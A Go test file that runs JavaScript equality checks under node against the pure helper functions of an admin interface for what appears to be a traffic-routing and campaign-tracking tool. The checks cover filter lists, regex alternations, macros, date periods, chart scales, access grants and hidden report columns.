//go:build uitest

// Behaviour of the SPA's pure helpers — the code that turns stored values into
// what the flow editor shows and back. A mistake there changes routing without
// a sound (a condition saved as something else), so the block between the
// "pure" markers is executed under node with the checks below, not just parsed.
// Requires node; run:
//
//	go test -tags=uitest ./internal/admin/ -run Logic
package admin

import (
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

var pureRe = regexp.MustCompile(`(?s)// ---- pure: begin ----(.*?)// ---- pure: end ----`)

func TestLogicHelpers(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the helper checks")
	}
	m := pureRe.FindStringSubmatch(spaSource())
	if m == nil {
		t.Fatal("the pure helpers block is not in the SPA")
	}
	html := spaSource()
	var prelude strings.Builder
	for _, name := range []string{"curKey", "curSign", "moneyUnits", "moneyText", "cpcHasSpend", "moneyCellCls", "asSortMeta", "applySort", "condsQS", "addBy", "normBy", "reportCostCur", "pagerPages"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		prelude.WriteString(fn)
		prelude.WriteByte('\n')
	}
	f := filepath.Join(t.TempDir(), "logic.js")
	if err := os.WriteFile(f, []byte(prelude.String()+m[1]+logicChecks), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("helper checks failed:\n%s", out)
	}
}

const logicChecks = `
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};

// A typed or pasted list.
eq(splitList('ru, us\nde|ua'), ['ru','us','de','ua'], 'commas, new lines and pipes separate');
eq(splitList(' a ,, b , A '), ['a','b'], 'trimmed, empties and repeats (any case) dropped');
eq(splitList(''), [], 'nothing typed');

// Which expressions read as words.
eq(altWords('/amazon|google|hetzner/i'), {words:['amazon','google','hetzner'],flags:'i'}, 'alternation with a flag');
eq(altWords('/buy|kupit/'), {words:['buy','kupit'],flags:''}, 'case-sensitive alternation');
eq(altWords('/example\\.com|foo\\.org/'), {words:['example.com','foo.org'],flags:''}, 'escaped dots are plain dots');
eq(altWords('/a\\|b|c/'), {words:['a|b','c'],flags:''}, 'an escaped pipe stays inside its word');
eq(altWords('/one word|two words/i'), {words:['one word','two words'],flags:'i'}, 'spaces are part of a word');
eq(altWords('/single/'), {words:['single'],flags:''}, 'one word');
['/^iphone/i', '/a{2,3}/', '/\\d+/', '/(a|b)/', '/iphone|/', '/|x/', '/a||b/', '//', 'amazon',
 '/x.y/', '/[ab]/', '/a+/', '/a$/', '/\\bword/'].forEach(s => eq(altWords(s), null, 'a real expression: ' + s));

// Words back to an expression.
eq(altRegex(['amazon','google'],'i'), '/amazon|google/i', 'words joined');
eq(altRegex(['example.com','a|b','c+d','(x)'],''), '/example\\.com|a\\|b|c\\+d|\\(x\\)/', 'special characters escaped');
[[['amazon','google'],'i'], [['example.com','foo.org'],''], [['a|b','c+d','[x]','^y$','1.5*2?'],'i']]
  .forEach(([w, f]) => eq(altWords(altRegex(w, f)), {words:w, flags:f}, 'round trip ' + w.join(' ')));

// How a stored condition is shown.
eq(listForm({flag:2,values:['ru','us'],raw:'ru,us'},false), {form:'words',words:['ru','us'],flags:'',raw:''}, 'values');
eq(listForm({flag:2,values:[],raw:'ru|ua'},false), {form:'words',words:['ru','ua'],flags:'',raw:''}, 'an old raw list with pipes');
eq(listForm({flag:2,values:['/amazon|google/i'],raw:'/amazon|google/i'},true),
  {form:'alt',words:['amazon','google'],flags:'i',raw:'/amazon|google/i'}, 'an alternation shows as words');
eq(listForm({flag:2,values:['/^Mozilla/'],raw:'/^Mozilla/'},true), {form:'regex',words:[],flags:'',raw:'/^Mozilla/'}, 'a real expression');
eq(listForm({flag:2,values:['/x/'],raw:''},true), {form:'words',words:['/x/'],flags:'',raw:''}, 'values alone are never an expression: the router reads raw');
eq(listForm(undefined,true), {form:'words',words:[],flags:'',raw:''}, 'no filter');

// What is stored.
const OFF = {flag:0,values:[],raw:''};
eq(listValue(2,'words',['ru','us']), {flag:2,values:['ru','us'],raw:'ru,us'}, 'words stored as values');
eq(listValue(2,'words',[]), OFF, 'an empty list is no filter');
eq(listValue(1,'words',['  ']), OFF, 'blank words dropped');
eq(listValue(2,'alt',['amazon','google'],'','/amazon|google/i','i'), {flag:2,values:['/amazon|google/i'],raw:'/amazon|google/i'}, 'untouched alternation kept');
eq(listValue(2,'alt',['a-b','c'],'','/a\\-b|c/',''), {flag:2,values:['/a\\-b|c/'],raw:'/a\\-b|c/'}, 'untouched alternation kept byte for byte');
eq(listValue(2,'alt',['amazon','google','ovh'],'','/amazon|google/i','i'), {flag:2,values:['/amazon|google|ovh/i'],raw:'/amazon|google|ovh/i'}, 'edited alternation keeps its flags');
eq(listValue(1,'alt',['buy','kupit','Pokupka'],'','/buy|kupit/',''), {flag:1,values:['/buy|kupit|Pokupka/'],raw:'/buy|kupit|Pokupka/'}, 'case-sensitive stays case-sensitive');
eq(listValue(2,'alt',[],'','/a|b/i','i'), OFF, 'every word removed');
eq(listValue(2,'regex',[],'/^Mozilla/i'), {flag:2,values:['/^Mozilla/i'],raw:'/^Mozilla/i'}, 'an expression');
eq(listValue(2,'regex',[],'abc'), {flag:2,values:['/abc/'],raw:'/abc/'}, 'slashes added');
eq(listValue(2,'regex',[],'  '), OFF, 'an empty expression is no filter');
eq(listValue(2,'words',['/buy|kupit/']), {flag:2,values:['/buy|kupit/'],raw:'/buy|kupit/'}, 'a typed /…/ is an expression');
eq(listValue(2,'words',['/x','y']), {flag:2,values:['/x','y'],raw:''}, 'raw never turns into an expression by accident');

// Expressions as typed, and the ones the engine could not use.
eq(rxText('  /a|b/i '), '/a|b/i', 'trimmed');
eq(rxText('abc'), '/abc/', 'slashes added');
eq(rxText(''), '', 'nothing typed');
eq(['/^Mozilla.*Android/i', '/a{2,3}/', 'plain words', '/\\d+ (x|y)/'].map(rxProblem), ['', '', '', ''], 'usable expressions');
eq(rxProblem('/a(b/'), 'not a valid expression', 'unbalanced group');
eq(rxProblem('/abc'), 'write it between slashes: /pattern/', 'no closing slash: the engine would never match');
eq(rxProblem('//i'), 'write it between slashes: /pattern/', 'empty pattern');
eq(rxProblem('/foo(?=bar)/'), 'lookarounds and back-references are not supported', 'lookahead: RE2 has none');
eq(rxProblem('/(?<!x)y/'), 'lookarounds and back-references are not supported', 'lookbehind');
eq(rxProblem('/(a)\\1/'), 'lookarounds and back-references are not supported', 'back-reference');

// The words a condition reads with.
eq(condOps('is','words'), ['is','is not'], 'exact lists');
eq(condOps('has','words'), ['contains','does not contain'], 'substrings');
eq(condOps('has','alt'), ['contains','does not contain'], 'substrings stored as an expression');
eq(condOps('dom','words'), ['is','is not'], 'domains are exact');
eq(condOps('dom','alt'), ['contains','does not contain'], 'a domain expression searches');
eq(condOps('has','regex'), ['matches','does not match'], 'an expression');

// Output variants.
eq(splitVariants('a|||b|||c'), ['a','b','c'], 'variants');
eq(splitVariants(' a ||| |||b '), ['a','b'], 'trimmed like the engine, empty dropped');
eq(splitVariants('one\ntwo '), ['one\ntwo '], 'a single output untouched');
eq(splitVariants(''), [], 'no output');
eq(splitVariants(null), [], 'no output (null)');
eq(joinVariants(['a','','b']), 'a|||b', 'empty variants dropped');
eq(joinVariants([' a ',' b']), 'a|||b', 'several are trimmed');
eq(joinVariants(['keep me ']), 'keep me ', 'one is kept as typed');
eq(joinVariants([]), '', 'none');
eq(joinVariants(splitVariants('x|||y|||z')), 'x|||y|||z', 'round trip');

// Page rewrites.
eq(rewriteRows('a|||b\nc|||d\r\nnoop\n'), [{find:'a',repl:'b'},{find:'c',repl:'d'}], 'pairs; lines without the separator skipped');
eq(rewriteRows('x|||y|||z'), [{find:'x',repl:'y|||z'}], 'split at the first separator, like the engine');
eq(joinRewrite([{find:'a',repl:'b'},{find:'',repl:'z'},{find:'c',repl:''}]), 'a|||b\nc|||', 'rows without find dropped');
eq(joinRewrite(rewriteRows('a|||b\nc|||d')), 'a|||b\nc|||d', 'round trip');

// Periods and days.
eq([60,3600,86400,604800,7200,1800,90,0,172800].map(humanSeconds),
  ['minute','hour','day','week','2 h','30 min','90 s','day','2 d'], 'periods');
eq(dayList([false,true,true,true,true,true,false]), 'weekdays', 'weekdays');
eq(dayList([true,false,false,false,false,false,true]), 'weekends', 'weekends');
eq(dayList([true,true,true,true,true,true,true]), 'every day', 'every day');
eq(dayList([false,false,false,false,false,false,false]), 'never', 'never');
eq(dayList([true,true,false,true,false,false,false]), 'Mon Wed Sun', 'Monday first');

// Macros.
eq(macroHTML('go [KEY] &amp; [PAR-1] [RANDNUM-1-9] [()COUNTRY()]'),
  'go <span class="mac">[KEY]</span> &amp; <span class="mac">[PAR-1]</span> <span class="mac">[RANDNUM-1-9]</span> <span class="mac">[()COUNTRY()]</span>', 'macros');
eq(macroHTML('[&quot;a&quot;] [lower] [1]'), '[&quot;a&quot;] [lower] [1]', 'not macros');
const mac='<span class="mac">';
const url='https://emaso.online/middleware?subid=[CID]&bundle_id={bundle_id}&country=[COUNTRY]&target_keys={target_keys}&x={not_a_macro}';
const painted=macroHTML(url, ['bundle_id','target_keys']);
eq(painted.includes(mac+'{bundle_id}</span>'), true, 'a known alias in braces uses the CID class');
eq(painted.includes(mac+'{target_keys}</span>'), true, 'target_keys in the known list uses the CID class');
eq(painted.includes(mac+'[CID]</span>'), true, 'a square macro keeps its class');
eq(painted.includes(mac+'[COUNTRY]</span>'), true, 'COUNTRY keeps its class beside a curly alias');
eq(painted.includes('{not_a_macro}'), true, 'an unknown brace name stays in the text');
eq(painted.includes(mac+'{not_a_macro}</span>'), false, 'an unknown brace name is not coloured');
eq(macroHTML('{keyword} {sub_id_1} {sub_id_30}'), mac+'{keyword}</span> '+mac+'{sub_id_1}</span> '+mac+'{sub_id_30}</span>', 'engine curly names are coloured without an alias list');
eq(macroHTML('{bundle_id} {target_keys} {not_a_macro}'), mac+'{bundle_id}</span> '+mac+'{target_keys}</span> {not_a_macro}', 'bundle_id and target_keys are known, an unknown name is not');
eq(macroHTML('{Keyword} {SUBID} {sub_id_31} {pack}'), '{Keyword} {SUBID} {sub_id_31} {pack}', 'wrong case, sub_id_31 and an alias that is not listed stay plain');
eq(macroHTML('&amp; {subid} {{income}}'), '&amp; '+mac+'{subid}</span> {{income}}', 'an entity stays, and a doubled brace is not a macro');
eq(campaignQueryAliases({parameters:{sub_id_1:'bundle_id', sub_id_2:'target_keys'}, cost_param:'cost'}, [{id:'s', parameters:{keyword:'utm_term'}}]).join(','), 'bundle_id,target_keys,cost', 'aliases are the campaign query names');

eq(nameSortKey('⚡️ 711 Casino'), '711 Casino', 'emoji before a name');
eq(nameSortKey('❌ SpinDog - Play'), 'SpinDog - Play', 'cross before a name');
eq(nameSortKey('All Offers'), 'All Offers', 'plain english name');
eq(nameSortKey('Ловушка'), 'Ловушка', 'cyrillic name');
eq(nameSortKey(''), '', 'empty string');
eq(nameSortKey('⚡️'), '⚡️', 'a lone mark stays itself');
eq(capFirst('flows'), 'Flows', 'capFirst word');
eq(capFirst('automation'), 'Automation', 'capFirst automation');
eq(capFirst(''), '', 'capFirst empty');

eq(findCountries('исп').map(c => c.code), ['es'], 'russian spain');
eq(findCountries('ісп').map(c => c.code), ['es'], 'ukrainian spain');
eq(findCountries('spain').map(c => c.code), ['es'], 'english spain');
eq(findCountries('es')[0].code, 'es', 'code es is first');
eq(countryCode('Испания'), 'es', 'full russian name');
eq(countryCode('es'), 'es', 'code stays the code');
eq(countryLabel('es', 'ru'), 'Испания', 'chip name ru');
eq(countryLabel('es', 'uk'), 'Іспанія', 'chip name uk');
eq(countryLabel('es', 'en') === 'es', false, 'name is not the code twice');
eq(countryLabel('unknown', 'ru'), 'Unknown', 'a country without a code is named Unknown');
const now = new Date('2026-10-13T15:00:00Z');
const ymd = (d) => d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0');
eq(ymd(periodSpan('today', now).from), '2026-10-13', 'today');
eq(ymd(periodSpan('yesterday', now).from), '2026-10-12', 'yesterday');
eq(ymd(periodSpan('week', now).from), '2026-10-12', 'week starts monday');
eq(ymd(periodSpan('month', now).from), '2026-10-01', 'month');
eq(ymd(periodSpan('prevmonth', now).from), '2026-09-01', 'previous month');
eq(ymd(periodSpan('year', now).from), '2026-01-01', 'year');
eq(periodSpan('all', now).from.toISOString().slice(0, 4), '2000', 'all time');
eq(periodSpan('7d', now).from.toISOString(), new Date(+now - 7 * 86400000).toISOString(), 'last 7 days');
eq(periodSpan('today', new Date('2026-10-13T23:30:00Z'), 'UTC').from.toISOString(), '2026-10-13T00:00:00.000Z', 'utc today');
eq(periodSpan('today', new Date('2026-10-13T10:00:00Z'), 'Europe/Kyiv').from.toISOString(), '2026-10-12T21:00:00.000Z', 'kyiv today');

// Chart scale, ticks and ratios.
eq(niceStep(15,6), 2.5, 'nice step 15/6'); eq(niceStep(0,6), 1, 'nice step empty');
eq(axisScale(0,15,true), {lo:0,hi:15,step:5,ticks:[0,5,10,15]}, 'int scale 0..15');
eq(axisScale(-30,120,false), {lo:-50,hi:125,step:25,ticks:[-50,-25,0,25,50,75,100,125]}, 'negative scale');
eq(axisScale(0,0,true), {lo:0,hi:1,step:1,ticks:[0,1]}, 'empty int scale');
eq(axisScale(0,2.5,false).ticks, [0,0.5,1,1.5,2,2.5], 'money 0..2.5');
eq(axisScale(0,5600,true).ticks, [0,1000,2000,3000,4000,5000,6000], 'clicks 0..5600');
eq(tickEvery(48,1000,44,[1,2,3,4,6,12,24]), 3, 'hour ticks wide'); eq(tickEvery(48,300,36,[1,2,3,4,6,12,24]), 6, 'hour ticks narrow'); eq(tickEvery(365,600,44,[1,2,7,14,30]), 30, 'daily ticks'); eq(tickEvery(400,100,44,[1,2,7]), 176, 'tail step');
eq(roiPct(100,0), 0, 'roi no cost'); eq(roiPct(150,100), 50, 'roi 50'); eq(roiPct(0,0), 0, 'roi nothing');
eq(ratioPct(1,0), null, 'ratio zero divisor'); eq(ratioPct(1,4), 25, 'ratio 25');
eq(overlapShare(0,100,0,100), 1, 'overlap full'); eq(overlapShare(0,100,50,200), 0.5, 'overlap half'); eq(overlapShare(0,100,200,300), 0, 'overlap none'); eq(overlapShare(10,10,0,100), 1, 'zero length inside'); eq(overlapShare(10,10,100,200), 0, 'zero length outside');
eq(tickDecimals(2.5), 1, 'decimals 2.5'); eq(tickDecimals(5), 0, 'decimals 5'); eq(tickDecimals(0.25), 2, 'decimals 0.25');

const mkPerfTree = (n) => Array.from({length: n}, (_, i) => ({id: 'c' + (i + 1), rows: []}));
eq(perfTop(mkPerfTree(12), 10).tree.map(n => n.id),
  ['c1','c2','c3','c4','c5','c6','c7','c8','c9','c10'], 'perfTop first campaigns');
eq(perfTop(mkPerfTree(12), 10).hiddenGroups, 2, 'perfTop hidden campaign count');
const rows15 = Array.from({length: 15}, (_, i) => ({stream: 's' + (i + 1), hits: 1}));
const perfNode = {id: 'x', rows: rows15};
const perfCut = perfTop([perfNode], 10);
eq(perfCut.tree[0].rows.length, 10, 'perfTop stream row count');
eq(perfCut.tree[0].hidden.map(r => r.stream), ['s11','s12','s13','s14','s15'], 'perfTop hidden stream names');
eq(perfNode.rows.length, 15, 'perfTop leaves source rows intact');
eq(perfTop(mkPerfTree(5), 10).hiddenGroups, 0, 'perfTop n above list size');
eq(perfTop(mkPerfTree(5), 10).tree.every(n => !(n.hidden || []).length), true, 'perfTop no hidden streams when n large');
eq(perfTop([], 10), {tree: [], hiddenGroups: 0}, 'perfTop empty tree');
const cmpConvDesc = perfCmp('conv', -1);
eq(cmpConvDesc({conv: 5, hits: 1}, {conv: 3, hits: 1}) < 0, true, 'perfCmp conv desc higher first');
eq(cmpConvDesc({conv: 5, hits: 10}, {conv: 5, hits: 5}) < 0, true, 'perfCmp conv desc tie by hits');
const cmpConvAsc = perfCmp('conv', 1);
eq(cmpConvAsc({conv: 3, hits: 1}, {conv: 5, hits: 1}) < 0, true, 'perfCmp conv asc lower first');
eq(cmpConvAsc({conv: 5, hits: 10}, {conv: 5, hits: 5}) < 0, true, 'perfCmp conv asc tie by hits');
eq(perfCmp('cr', -1)({conv: 0, hits: 0}, {conv: 0, hits: 0}), 0, 'perfCmp cr with zero hits');

eq(codeMode('index.php'), 'php', 'codeMode php');
eq(codeMode('a/b/Style.CSS'), 'css', 'codeMode css case');
eq(codeMode('x.htaccess'), 'text', 'codeMode unknown ext');
eq(codeMode('app.mjs'), 'javascript', 'codeMode mjs');
eq(codeMode('m.webmanifest'), 'json', 'codeMode webmanifest');

eq(deviceKey('phone'), 'dev.phone', 'device phone');
eq(deviceKey(' Tablet '), 'dev.tablet', 'device tablet trimmed');
eq(deviceKey('computer'), 'dev.computer', 'device computer');
eq(deviceKey('tv'), '', 'device unknown');
eq(deviceKey(''), '', 'device empty');
const deduped = dedupeConds([{f:'campaign',op:'eq',v:['1']},{f:'campaign',op:'eq',v:['2']},{f:'device',op:'eq',v:['phone']}]);
eq(deduped.length, 2, 'dedupeConds length');
eq(deduped[0].v[0], '1', 'dedupeConds first campaign value');
eq(deduped[1].f, 'device', 'dedupeConds second field');

eq(accessPages(null), [], 'accessPages null');
eq(accessPages({pages:'x'}), [], 'accessPages not array');
eq(accessPages({pages:['flows']}), ['flows'], 'accessPages list');
eq(pageAllowed(null, 'settings'), true, 'settings always');
eq(pageAllowed({access:{sections:[]}, pages:[]}, 'users'), false, 'users without pages');
eq(pageAllowed({access:{sections:['users']}, pages:['users']}, 'users'), true, 'users in pages');
eq(sectionAllowed({access:{}, pages:['settings']}, 'settings'), true, 'sectionAllowed settings');
eq(sectionAllowed({access:{}, pages:[]}, 'bot_protection'), false, 'sectionAllowed missing');
eq(canEdit(null, 'offers', {id:'1'}), true, 'canEdit admin');
const readMe={access:{grants:{offers:{mode:'read'}}}};
eq(canEdit(readMe, 'offers', {id:'1'}), false, 'canEdit read');
const selMe={access:{grants:{offers:{mode:'selected',ids:['o1'],labels:['grp']}}}};
eq(canEdit(selMe, 'offers', {id:'o1'}), true, 'canEdit selected id');
eq(canEdit(selMe, 'offers', {id:'x',group:'grp'}), true, 'canEdit selected label');
const crtMe={uid:'u1',access:{grants:{offers:{mode:'created',ids:[],labels:[]}}}};
eq(canEdit(crtMe, 'offers', {id:'n',created_by:'u1'}), true, 'canEdit created uid');
eq(canCreate(readMe, 'offers'), false, 'canCreate read');
eq(canCreate({access:{grants:{offers:{mode:'full'}}}}, 'offers'), true, 'canCreate full');
const hidProfit=hiddenCols({access:{hidden:['profit']}});
eq(hidProfit.has('roi'), true, 'hiddenCols profit has roi');
eq(hidProfit.has('cr'), false, 'hiddenCols profit not cr');

// The hidden list of /api/me drives the columns; access.hidden is the fallback and both may be absent.
eq([...hiddenFields({hidden:['cost','ip']})].sort(), ['cost','cost_cents','cost_cur','ip'], 'hiddenFields spells out the cost group');
eq([...hiddenFields({access:{hidden:['profit']}})], ['profit'], 'hiddenFields reads access.hidden');
eq(hiddenFields(null).size, 0, 'hiddenFields without a payload');
eq(hiddenFields({hidden:null,access:{}}).size, 0, 'hiddenFields without lists');
eq(hiddenCols({access:{grants:{}}}).size, 0, 'hiddenCols without hidden keys');
const hidStatus=hiddenCols({hidden:['status']});
eq(['leads','sales','rej','crok','crrej'].every(id=>hidStatus.has(id)), true, 'hidden status removes the lead, sale and reject columns');
eq(hidStatus.has('conv'), false, 'hidden status keeps the confirmed conversions');
eq(hidStatus.has('profit'), false, 'hidden status keeps the money');
const hidCostCur=hiddenCols({hidden:['cost_cur']});
eq(hidCostCur.has('cost')&&hidCostCur.has('roi')&&hidCostCur.has('profit'), true, 'a hidden cost field hides the money derived from cost');
const hidUniq=hiddenCols({hidden:['uniq','bot']});
eq(hidUniq.has('unique')&&hidUniq.has('uniq')&&hidUniq.has('uepc')&&hidUniq.has('bots'), true, 'hidden uniq and bot remove their columns');
eq(hidUniq.has('visit'), true, 'hidden uniq removes the visit column, which would show a false repeat');
eq(hiddenCols({hidden:['os']}).has('osbrowser'), false, 'one hidden half keeps the OS / browser column');
eq(hiddenCols({hidden:['os','browser']}).has('osbrowser'), true, 'both hidden halves remove the OS / browser column');
eq(osBrowserText(null, {os:'Windows',browser:'Chrome'}), 'Windows Chrome', 'OS and browser for an administrator');
eq(osBrowserText({hidden:['os']}, {browser:'Chrome'}), 'Chrome', 'a hidden OS leaves the browser alone');
eq(osBrowserText({hidden:['browser']}, {os:'Windows',browser:'Chrome'}), 'Windows', 'a hidden browser is not shown even if present');
eq(osBrowserText({hidden:['os','browser']}, {os:'Windows',browser:'Chrome'}), '', 'both hidden give an empty cell');
eq(osBrowserText(null, null), '', 'no row, no text');
eq(visitKind(null, {uniq:true}), 'unique', 'visit unique');
eq(visitKind(null, {uniq:false}), 'repeat', 'visit repeat');
eq(visitKind(null, {bot:'google',uniq:true}), 'bot', 'visit bot');
eq(visitKind({hidden:['uniq']}, {}), '', 'hidden uniq gives no repeat label');
eq(visitKind({hidden:['uniq']}, {bot:'google'}), 'bot', 'hidden uniq keeps a detected bot');
eq(visitKind({hidden:['bot']}, {uniq:true}), 'unique', 'hidden bot keeps the unique label');
eq(columnHidden({hidden:['ip']}, ['ip']), true, 'columnHidden names a hidden field');
eq(columnHidden({hidden:['ip']}, ['country']), false, 'columnHidden leaves other fields');
eq(columnHidden({hidden:['cost']}, ['cost_cur']), true, 'columnHidden knows the members of the cost group');
eq(columnHidden({hidden:['status']}, []), false, 'columnHidden with no fields');
eq(offerPayoutHidden({hidden:['profit']}), true, 'payout is hidden with profit');
eq(offerPayoutHidden({hidden:['cost']}), false, 'payout stays with cost hidden');
eq(offerPayoutHidden(null), false, 'payout is shown to administrators');

// Roles: the editor shares the user editor and sends no record lists.
eq(accessModes(['full','read','selected','created'], true), ['full','read','created'], 'a role has no selected mode');
eq(accessModes(['full','read','selected','created'], false), ['full','read','selected','created'], 'a user has every mode');
eq(grantBody('created', ['a'], ['l'], true), {mode:'created'}, 'role grant has no ids');
eq(grantBody('created', ['a'], ['l'], false), {mode:'created', ids:['a'], labels:['l']}, 'user created grant keeps its lists');
eq(grantBody('selected', ['a'], [], false), {mode:'selected', ids:['a'], labels:[]}, 'selected grant keeps its lists');
eq(grantBody('read', ['a'], ['l'], false), {mode:'read'}, 'read grant has no lists');
eq(hideChoices(null, null), ['cost','profit'], 'no field list gives the money groups');
eq(hideChoices([{name:'ts',hideable:false},{name:'ip',hideable:true},{name:'cost_cents',hideable:true},{name:'profit',hideable:true},{name:'country'}], ['ip','legacy']), ['cost','profit','ip','legacy'], 'only hideable fields, the cost members are the cost group, leftovers stay');
eq(hideChoices([{name:'ip',hideable:true},{name:'sub_id_2',hideable:true},{name:'country',hideable:true},{name:'depsum',hideable:true},{name:'campaign',hideable:true},{name:'sub_id_1',hideable:true},{name:'cid',hideable:true},{name:'org',hideable:true}], []), ['campaign','cost','profit','depsum','country','cid','sub_id_1','sub_id_2','ip','org'], 'chips follow the display order of the groups');
eq(byFieldOrder([{name:'zzz'},{name:'ip'},{name:'campaign'},{name:'aaa'}], f=>f.name).map(f=>f.name), ['campaign','ip','zzz','aaa'], 'unlisted fields keep their order after the listed ones');
eq(userRoleField('USER','r1','',true), {role_id:'r1'}, 'create with a role sends it');
eq(userRoleField('USER','','',true), {}, 'create with own access sends no role_id');
eq(userRoleField('USER','r1','r1',false), {}, 'an unchanged role is not sent');
eq(userRoleField('USER','','r1',false), {role_id:''}, 'own access takes the role off');
eq(userRoleField('USER','r2','r1',false), {role_id:'r2'}, 'another role is sent');
eq(userRoleField('ADMIN','r1','',true), {}, 'an administrator is created without a role');
eq(userRoleField('ADMIN','r1','r1',false), {role_id:''}, 'promotion drops the stored role');
eq(userRoleField('ADMIN','','',false), {}, 'an administrator without a role sends nothing');
eq(roleChoices(null,'').length, 0, 'unavailable roles offer nothing');
eq(roleChoices([{id:'a',name:'A'}], 'gone'), [{id:'a',name:'A'},{id:'gone',name:''}], 'a stored role missing from the list stays selectable');
eq(roleNameOf({role_id:'a'}, [{id:'a',name:'A'}]), {id:'a',name:'A'}, 'roleNameOf finds the name');
eq(roleNameOf({role_id:'a'}, null), {id:'a',name:''}, 'roleNameOf with unavailable roles');
eq(roleNameOf({login:'x'}, [{id:'a',name:'A'}]), null, 'roleNameOf without a role');
eq(roleNameOf(null, []), null, 'roleNameOf without a user');

// Server texts of roles and hidden fields have a translation key.
eq(errInfo('roles unavailable'), {key:'err.roles.off', vars:{}}, 'roles unavailable');
eq(errInfo('roles unavailable: roles.json: invalid character'), {key:'err.roles.bad', vars:{reason:'roles.json: invalid character'}}, 'roles unavailable with a reason');
eq(errInfo('user has a role').key, 'err.user.role', 'user has a role');
eq(errInfo('role in use').key, 'err.role.inuse', 'role in use');
eq(errInfo('security: role already exists').key, 'err.role.exists', 'role name taken');
eq(errInfo('security: invalid role name').key, 'err.role.name', 'role name invalid');
eq(errInfo('unknown access mode: selected is set per user: offers').key, 'err.role.selected', 'selected mode in a role');
eq(errInfo('macro [IP] uses hidden field ip'), {key:'err.macro.hidden', vars:{macro:'[IP]', fld:'ip'}}, 'macro of a hidden field');
eq(errInfo('macro {sub_id_1} uses hidden field sub_id_1').vars.macro, '{sub_id_1}', 'curly macro of a hidden field');
eq(errInfo('macro {foo} may read a hidden field'), {key:'err.macro.curly', vars:{name:'foo'}}, 'curly name may read a hidden field');
eq(errInfo('macro [NEW] needs a named parameter'), {key:'err.macro', vars:{text:'[NEW] needs a named parameter'}}, 'any other macro text is known by its prefix');
eq(errInfo('source parameter sub_id_2 belongs to a hidden field'), {key:'err.param.source', vars:{key:'sub_id_2'}}, 'source parameter of a hidden field');
eq(errInfo('source maps keyword, a hidden field'), {key:'err.param.maps', vars:{key:'keyword'}}, 'source maps a hidden field');
eq(errInfo('campaign price parameter belongs to a hidden field').key, 'err.param.price', 'price parameter of a hidden field');
eq(errInfo('bad filter: hidden field ip'), {key:'err.hidden.filter', vars:{fld:'ip'}}, 'filter by a hidden field');
eq(errInfo('forbidden').key, 'err.forbidden', 'forbidden');
eq(errInfo('network offer_query: macro [IP] uses hidden field ip'), {key:'err.net.query', vars:{inner:'macro [IP] uses hidden field ip'}}, 'network query with a hidden macro');
eq(errInfo('network offer_query: anything new').key, 'err.net.query', 'any network offer_query text is known by its prefix');
eq(errInfo('offer_query must be a query string').key, 'err.net.querybad', 'offer_query shape');
eq(errInfo('stream Main sends a hidden field: its output cannot change'), {key:'err.stream.frozen', vars:{name:'Main'}}, 'frozen stream output');

// Parameters of hidden fields are read-only in the source and the campaign.
eq(sourceKeyLocked({hidden:['keyword']}, 'keyword'), true, 'hidden keyword locks its source parameter');
eq(sourceKeyLocked({hidden:['sub_id_3']}, 'sub_id_3'), true, 'hidden Sub ID locks its source parameter');
eq(sourceKeyLocked({hidden:['sub_id_3']}, 'sub_id_4'), false, 'other Sub IDs stay editable');
eq(sourceKeyLocked({hidden:['ip']}, 'keyword'), false, 'an unrelated hidden field locks nothing');
eq(sourceKeyLocked(null, 'keyword'), false, 'administrators lock nothing');
eq(sourceKeyLocked({hidden:['keyword']}, 'other'), false, 'only bound source keys lock');
eq(sourceKeyLocked({hidden:['site']}, 'site'), true, 'hidden site locks its source parameter');
eq(sourceKeyLocked({hidden:['site']}, 'ad_campaign_id'), false, 'visible extra fields stay editable');
eq(priceParamLocked({hidden:['cost']}), true, 'hidden cost locks the price parameters');
eq(priceParamLocked({hidden:['cost_cur']}), true, 'a hidden cost member locks them too');
eq(priceParamLocked({hidden:['profit']}), false, 'hidden profit leaves the price parameters');
eq(linksGuarded({hidden:['ip']}), true, 'a hidden field guards the links');
eq(linksGuarded({hidden:[]}), false, 'no hidden field, no guard');
eq(linksGuarded(null), false, 'administrators have no guard');

// Campaign parameter rows: a typed name and token are stored, a source name left as it is is not, and a locked row ignores the inputs.
eq(campaignParamDraft([{key:'keyword', name:'utm_term', base:'', token:'{kw}', tokenHint:''}]), {parameters:{keyword:'utm_term'}, tokens:{keyword:'{kw}'}}, 'a typed name and token are stored');
eq(campaignParamDraft([{key:'keyword', name:'target_keys', base:'target_keys', token:'{keyword}', tokenHint:'{keyword}'}]), {parameters:{}, tokens:{}}, 'the source name and the outgoing mask are not stored again');
eq(campaignParamDraft([{key:'sub_id_1', name:'', base:'sub1', token:'', tokenHint:'{sub_id_1}'}]), {parameters:{sub_id_1:''}, tokens:{}}, 'clearing a source name stores an empty override');
eq(campaignParamDraft([{key:'keyword', name:'hack', base:'', token:'hack', tokenHint:'', locked:true, hadName:true, prevName:'keep', hadToken:true, prevToken:'{old}'}]), {parameters:{keyword:'keep'}, tokens:{keyword:'{old}'}}, 'a locked row keeps the saved values');
eq(campaignParamDraft([{key:'site', name:'x', base:'', token:'', tokenHint:'', locked:true}]), {parameters:{}, tokens:{}}, 'a locked row without a saved override stores nothing');

// Opening the editor and saving without an edit gives back the same grants; a missing grant stays missing.
const RES=['campaigns','offers','landings','sources','networks','domains'], MODES=['full','read','selected','created'];
const roundTrip=(acc, forRole)=>grantsFromRows(grantRows(acc, forRole, RES, MODES), forRole);
const userGrants={campaigns:{mode:'selected',ids:['a','b'],labels:['L']}, offers:{mode:'read'}, sources:{mode:'full'}, domains:{mode:'created',ids:[],labels:[]}};
eq(roundTrip({grants:userGrants}, false), userGrants, 'a user access survives open and save');
const roleGrants={campaigns:{mode:'created'}, offers:{mode:'read'}, networks:{mode:'full'}};
eq(roundTrip({grants:roleGrants}, true), roleGrants, 'a role access survives open and save');
eq(roundTrip({grants:{}}, false), {}, 'no grants stay no grants for a user');
